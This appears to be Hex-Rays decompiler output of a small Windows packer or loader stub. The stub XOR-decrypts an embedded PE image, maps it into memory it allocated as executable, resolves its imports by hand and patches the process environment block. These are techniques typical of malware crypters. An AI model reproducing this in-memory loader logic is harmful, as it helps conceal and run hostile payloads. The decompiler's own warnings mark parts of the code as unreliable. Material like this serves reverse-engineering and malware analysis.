/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// DWORD __stdcall GetLastError();
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// BOOL __stdcall GetProcessTimes(HANDLE hProcess, LPFILETIME lpCreationTime, LPFILETIME lpExitTime, LPFILETIME lpKernelTime, LPFILETIME lpUserTime);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
void start();
void __noreturn sub_401040(); // weak
void __cdecl __noreturn sub_40108A(_BYTE *a1, int a2);
void sub_4010CF();
_BYTE *sub_4010DA();
DWORD sub_40114D();
void __stdcall __noreturn sub_401160(int a1, int a2, int a3);
_BYTE *__stdcall sub_401168(_BYTE *a1, _BYTE *a2, int a3);
int sub_40118B();
void sub_4011FC();
void sub_401210();

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_40103A; // weak
int dword_402000; // weak
int dword_402008; // weak
int dword_402120; // weak


//----- (00401020) --------------------------------------------------------
void start()
{
  void (*v0)(void); // ebx

  v0 = (void (*)(void))((char *)&loc_40103A + sub_40114D());
  v0();
  sub_4010DA();
  sub_401210();
}

//----- (00401040) --------------------------------------------------------
void __noreturn sub_401040()
{
  DWORD flOldProtect; // [esp+0h] [ebp-4h] BYREF

  dword_402000 = *(_DWORD *)(((unsigned int)sub_401040 & 0xFFFF0000) + 0x7074);
  dword_402008 = ((unsigned int)sub_401040 & 0xFFFF0000) + 28808;
  VirtualProtect((LPVOID)(((unsigned int)sub_401040 & 0xFFFF0000) + 28808), dword_402000, 4u, &flOldProtect);
  sub_40108A((_BYTE *)dword_402008, dword_402000);
}
// 401040: using guessed type void __noreturn sub_401040();
// 402000: using guessed type int dword_402000;
// 402008: using guessed type int dword_402008;

//----- (0040108A) --------------------------------------------------------
void __cdecl __noreturn sub_40108A(_BYTE *a1, int a2)
{
  char v2; // bl
  char v3; // cl
  char v4; // dl

  v2 = sub_40114D() - 39;
  while ( 1 )
  {
    *a1 ^= v2;
    v2 -= 6;
    sub_4010CF();
    *a1 ^= v3;
    sub_4010CF();
    *a1 ^= v4;
    sub_4010CF();
  }
}
// 4010B5: variable 'v3' is possibly undefined
// 4010BF: variable 'v4' is possibly undefined

//----- (004010CF) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void sub_4010CF()
{
  ;
}
// 4010CC: positive sp value 8 has been found
// 4010CF: could not find valid save-restore pair for ebp

//----- (004010DA) --------------------------------------------------------
_BYTE *sub_4010DA()
{
  int v0; // ebx
  _BYTE *v1; // esi
  _DWORD *v2; // edi
  int v4; // [esp+10h] [ebp-4h]

  v0 = *(_DWORD *)(dword_402008 + 60) + dword_402008;
  dword_402120 = *(_DWORD *)(v0 + 52);
  v4 = *(unsigned __int8 *)(v0 + 6);
  v1 = VirtualAlloc(*(LPVOID *)(v0 + 52), *(_DWORD *)(v0 + 80), 0x3000u, 0x40u);
  sub_401168(v1, (_BYTE *)dword_402008, *(_DWORD *)(v0 + 84));
  v2 = (_DWORD *)(v0 + 248);
  do
  {
    sub_401168(&v1[v2[3]], (_BYTE *)(v2[5] + dword_402008), v2[4]);
    v2 += 10;
    --v4;
  }
  while ( v4 );
  return &v1[*(_DWORD *)(v0 + 40)];
}
// 402008: using guessed type int dword_402008;
// 402120: using guessed type int dword_402120;

//----- (0040114D) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
DWORD sub_40114D()
{
  void *v1; // [esp-10h] [ebp-10h]
  struct _FILETIME *v2; // [esp-Ch] [ebp-Ch]
  struct _FILETIME *v3; // [esp-8h] [ebp-8h]
  struct _FILETIME *v4; // [esp-4h] [ebp-4h]
  struct _FILETIME *savedregs; // [esp+0h] [ebp+0h]

  GetProcessTimes(v1, v2, v3, v4, savedregs);
  return GetLastError();
}
// 401156: positive sp value 10 has been found
// 401150: variable 'v1' is possibly undefined
// 401150: variable 'v2' is possibly undefined
// 401150: variable 'v3' is possibly undefined
// 401150: variable 'v4' is possibly undefined
// 401150: variable 'savedregs' is possibly undefined

//----- (00401160) --------------------------------------------------------
void __stdcall __noreturn sub_401160(int a1, int a2, int a3)
{
  ExitProcess(0);
}

//----- (00401168) --------------------------------------------------------
_BYTE *__stdcall sub_401168(_BYTE *a1, _BYTE *a2, int a3)
{
  _BYTE *result; // eax
  int i; // ecx

  result = a2;
  for ( i = a3; i; --i )
    *a1++ = *result++;
  return result;
}

//----- (0040118B) --------------------------------------------------------
int sub_40118B()
{
  _DWORD *v0; // ebx
  _DWORD *v1; // esi
  FARPROC *v2; // edi
  HMODULE hModule; // [esp+0h] [ebp-4h]

  v0 = (_DWORD *)(dword_402120 + *(_DWORD *)(dword_402120 + *(_DWORD *)(dword_402120 + 60) + 128));
  do
  {
    hModule = LoadLibraryA((LPCSTR)(dword_402120 + v0[3]));
    v1 = (_DWORD *)(dword_402120 + *v0);
    v2 = (FARPROC *)(dword_402120 + v0[4]);
    do
      *v2++ = GetProcAddress(hModule, (LPCSTR)(dword_402120 + *v1++ + 2));
    while ( *v1 );
    v0 += 5;
  }
  while ( v0[3] );
  return 0;
}
// 402120: using guessed type int dword_402120;

//----- (004011FC) --------------------------------------------------------
void sub_4011FC()
{
  NtCurrentTeb()->ProcessEnvironmentBlock->Mutant = (void *)dword_402120;
}
// 402120: using guessed type int dword_402120;

//----- (00401210) --------------------------------------------------------
void sub_401210()
{
  sub_40118B();
  sub_4011FC();
}

// nfuncs=11 queued=11 decompiled=11 lumina nreq=0 worse=0 better=0
// ALL OK, 11 function(s) have been successfully decompiled
